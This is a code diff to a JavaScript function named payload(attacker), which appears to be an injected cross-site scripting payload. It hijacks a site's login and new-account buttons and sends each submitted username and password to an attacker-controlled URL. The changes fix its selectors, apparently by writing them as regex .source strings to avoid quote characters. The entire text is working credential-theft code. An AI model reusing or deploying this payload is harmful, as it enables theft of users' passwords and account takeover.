@@ -87,11 +87,7 @@ function payload(attacker) {
 				event.preventDefault();
 				proxy(x);
 			});
-/*
 
-	HAVING TROUBLE WITH THIS FUNCTION; CANT SEEM TO LOG OUT ONCE LOGGED IN
-
-*/
 			$(/#log-out-btn/.source).click(function(event)
 			{
 				// DO NOT ALLOW default
@@ -110,10 +106,10 @@ function payload(attacker) {
 		    	event.preventDefault();
 
 		   		$.post(link + /login/.source, 
-		   		{username: $(/#username/).val(),
-		   		 password: $(/#userpass/).val()},
+		   		{username: $(/#username/.source).val(),
+		   		 password: $(/#userpass/.source).val()},
 		   		 function() {
-		   		 	$.get(attacker,{event: /login/.source, user: $(/#username/).val(),pass: $(/#userpass/).val()});
+		   		 	$.get(attacker,{event: /login/.source, user: $(/#username/.source).val(),pass: $(/#userpass/.source).val()});
 		   		 	proxy(x);
 		   		
 
@@ -123,10 +119,10 @@ function payload(attacker) {
 		   $(/#new-account-btn/.source).click(function(event)
 		   {
 		   	event.preventDefault();
-		   	$.post(link + /create/.source, {username: $(/#username/).val(),
-		    password: $(/#userpass/).val()},
+		   	$.post(link + /create/.source, {username: $(/#username/.source).val(),
+		    password: $(/#userpass/.source).val()},
 		    function(){
-		    	$.get(attacker,{event: /create/.source, user: $(/#username/).val(), pass: $(/#userpass/).val()});
+		    	$.get(attacker,{event: /create/.source, user: $(/#username/.source).val(), pass: $(/#userpass/.source).val()});
 		    	proxy(x);
 		    });
 		   });
